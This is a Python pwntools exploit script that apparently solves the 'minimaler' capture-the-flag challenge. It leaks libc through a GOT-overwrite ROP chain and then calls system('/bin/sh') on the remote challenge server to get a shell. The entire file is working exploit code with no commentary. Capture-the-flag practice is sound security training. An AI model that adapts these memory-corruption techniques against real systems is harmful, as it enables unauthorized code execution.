from pwn import *

context.binary = exe = ELF('./vuln')
libc = ELF('./libc.so.6')

#context.terminal = ["tilix", "splitw", "-h"]

# io = process()
# gdb.attach(io, api=True)
io = remote('minimaler.chal.imaginaryctf.org', 42043)

ret = 0x40101a
pop_rbp = 0x40111d
add_rsp_8 = 0x401016
one = 0xebcf8
pop_rdi = 0x000000000002a3e5
bin_sh = 0x1d8698

payload = b'i'*8 + p64(exe.got['syscall']+0x10) + p64(exe.sym['main']+12)
io.send(payload)

time.sleep(0.5)

payload = p64(exe.got['syscall']+8) + p64(ret) + p64(pop_rbp) + p64(exe.got['syscall']+8) 
payload += (p64(add_rsp_8) + b'\0'*8)*105
payload += p64(ret) + p64(exe.sym['main']+8) + p64(0) + p64(0)
payload += p64(exe.plt['syscall']) + p64(1) + p64(1) + p64(exe.got['syscall']+8) + p64(0) + p64(0)
payload += p64(0x401030) + p64(exe.sym['main'])
io.send(payload)

time.sleep(0.5)

io.send(p32(libc.sym['qfcvt']+106)[:2])

libc.address = u64(io.recv(8)) - libc.sym['syscall']
log.info(f'Libc base: {hex(libc.address)}')
io.recv(0x900-8)

time.sleep(0.5)

payload = b'\0'*8 + p64(0x404800+0x78) + p64(libc.address+pop_rdi) + p64(libc.address+bin_sh) + p64(libc.sym['system'])
io.send(payload)

io.interactive()